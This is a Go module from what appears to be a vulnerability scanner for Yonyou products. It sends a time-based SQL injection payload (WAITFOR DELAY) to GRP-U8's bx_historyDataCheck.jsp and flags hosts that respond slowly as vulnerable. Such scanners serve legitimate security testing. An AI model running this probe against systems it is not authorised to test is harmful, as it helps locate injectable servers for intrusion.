package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func Bx_historyDataCheckScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	const bx_historyDataCheck = "用友 GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞"
	urls := address + "/u8qx/bx_historyDataCheck.jsp"

	// 记录请求开始时间
	startTime := time.Now()

	// 发送 POST 请求
	response, err := client.Post(urls, "application/x-www-form-urlencoded", strings.NewReader("userName=';WAITFOR DELAY '0:0:5'--&ysnd=&historyFlag="))
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, bx_historyDataCheck)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, bx_historyDataCheck)
		}
		return
	}
	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		body, err := ioutil.ReadAll(response.Body)
		if err != nil {
			output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 读取响应内容失败: %v", Cyan, currentTime, Reset, Yellow, Reset, bx_historyDataCheck, err)
			fmt.Println(output)
			return
		}

		// 计算请求耗时
		elapsedTime := time.Since(startTime)

		// 检查漏洞是否存在
		if strings.Contains(string(body), "0") && elapsedTime.Seconds() > 4 {
			result := bx_historyDataCheck + "：" + urls
			output := fmt.Sprintf("[%s%s%s] [%s+%s] 存在%s：%s", Green, currentTime, Reset, Green, Reset, bx_historyDataCheck, urls)
			fmt.Println(output)

			// 保存结果到文件
			timestamp := time.Now().Format("20230712")
			filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
			if err := Utils.SaveResultToFile(result, filename); err != nil {
				log.Printf("保存结果到文件出错: %v", err)
			}
		} else {
			output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s，状态码: %d", Cyan, currentTime, Reset, Yellow, Reset, bx_historyDataCheck, response.StatusCode)
			fmt.Println(output)
		}
	}
}
